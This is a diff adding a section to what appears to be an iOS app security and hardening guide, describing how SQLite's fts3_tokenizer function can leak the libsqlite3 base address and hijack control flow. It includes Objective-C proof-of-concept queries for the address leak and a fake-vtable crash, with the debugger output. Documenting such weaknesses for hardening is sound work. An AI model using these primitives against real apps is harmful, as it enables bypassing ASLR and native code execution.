@@ -105,6 +105,37 @@ sqlite3_bind_int(selectUid, 1, uid);
 int status = sqlite3_step(selectUid);
 ```
 
+What's even worse, libsqlite3.dylib in iOS supports `fts3_tokenizer` function, which has two security issues by design. This SQL function has two prototype:
+
+```sql
+SELECT fts3_tokenizer(<tokenizer-name>);
+SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>);
+```
+
+The first from can be abused to leak the base address of libsqlite3.dylib, which breaks ASLR.
+
+```objectivec
+FMResultSet *s = [db executeQuery:@"SELECT hex(fts3_tokenizer('simple')) as fts;"];
+while ([s next]) {
+    NSString *val = [s stringForColumn:@"fts"];
+    NSLog(@"val: %@", val); // the address of simpleTokenizerModule in libsqlite3.dylib, in big endian
+}
+```
+
+If the second argument is given, it registers a new tokenizer and the argument is the address of a virtual function table. This will lead to native code execution via SQLite3 callbacks:
+
+```objectivec
+FMResultSet *s1 = [db executeQuery:@"select fts3_tokenizer('simple', x'4141414141414141');"];
+FMResultSet *s2 = [db executeQuery:@"create virtual table a using fts3;"];
+NSLog(@"%d", [s2 next]); // the application will crash here
+```
+
+The crash information:
+
+```
+thread #1: tid = 0x19ac77, 0x0000000184530764 libsqlite3.dylib`___lldb_unnamed_symbol1073$$libsqlite3.dylib + 1500, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4141414141414149)
+```
+
 ## App hardening
 
 ### Hardening: Enable exploit mitigation compile-time options
